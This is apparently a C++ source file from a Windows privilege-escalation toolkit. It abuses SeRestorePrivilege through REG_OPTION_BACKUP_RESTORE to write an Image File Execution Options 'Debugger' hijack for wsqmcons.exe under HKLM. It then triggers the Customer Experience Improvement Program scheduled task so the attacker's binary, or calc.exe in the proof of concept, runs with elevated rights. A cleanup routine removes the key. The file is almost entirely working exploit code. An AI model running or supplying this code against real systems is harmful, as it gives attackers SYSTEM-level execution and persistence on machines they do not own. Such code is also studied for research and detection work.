#include "poptoke.h"

// obligatory calc poc; see registry functions below for further usage
void
se_restore_priv()
{
	DWORD sID;
	ProcessIdToSessionId(GetCurrentProcessId(), &sID);
	std::string data = "\"C:\\Windows\\System32\\calc.exe\"";

	HKEY handle;
	LSTATUS stat = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wsqmcons.exe",
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&handle,
		NULL);

	if (stat != ERROR_SUCCESS){
		printf("[-] Failed opening key! %d\n", stat);
		return;
	}

	stat = RegSetValueExA(handle, "Debugger", 0, REG_SZ, (const BYTE*)data.c_str(), data.length() + 1);
	if (stat != ERROR_SUCCESS){
		printf("[-] Failed writing key! %d\n", stat);
		return;
	}

	printf("[+] Key set");
	RegCloseKey(handle);
	return;
}

/*

*/
void
create_registry_entry(DWORD options)
{
	LPCSTR regval = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wsqmcons.exe";
	char fpath[1024];
	char regentry[1024];
	HKEY hkReg;
	LSTATUS status;
	DWORD sessionid;

	// fetch image path
	GetModuleFileNameA(NULL, fpath, 1024);
	ProcessIdToSessionId(GetParentProcessId(), &sessionid);
	printf("Running in session id: %d\n", sessionid);
	_snprintf(regentry, 1024, "\"%s\" %d", fpath, sessionid);

	// open reg
	if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		regval,
		0,
		NULL,
		options,
		KEY_SET_VALUE,
		NULL,
		&hkReg,
		NULL) != ERROR_SUCCESS)
	{
		printf("Failed to open registry: %d\n", GetLastError());
		return;
	}

	// set
	if (RegSetValueExA(hkReg,
		"Debugger",
		0,
		REG_SZ,
		(const BYTE*)regentry,
		strlen(regentry) + 1) != ERROR_SUCCESS)
	{
		printf("Failed to set key: %d\n", GetLastError());
		RegCloseKey(hkReg);
		return;
	}

	printf("[+] Registry set, starting schtask...\n");
	system("schtasks /Run /TN \"\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\"");
}

void
delete_registry_entry(DWORD options)
{
	LPCSTR regval = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wsqmcons.exe";

	if (RegDeleteKeyA(HKEY_LOCAL_MACHINE, regval) != ERROR_SUCCESS)
		printf("[-] Failed to delete key!\n");
}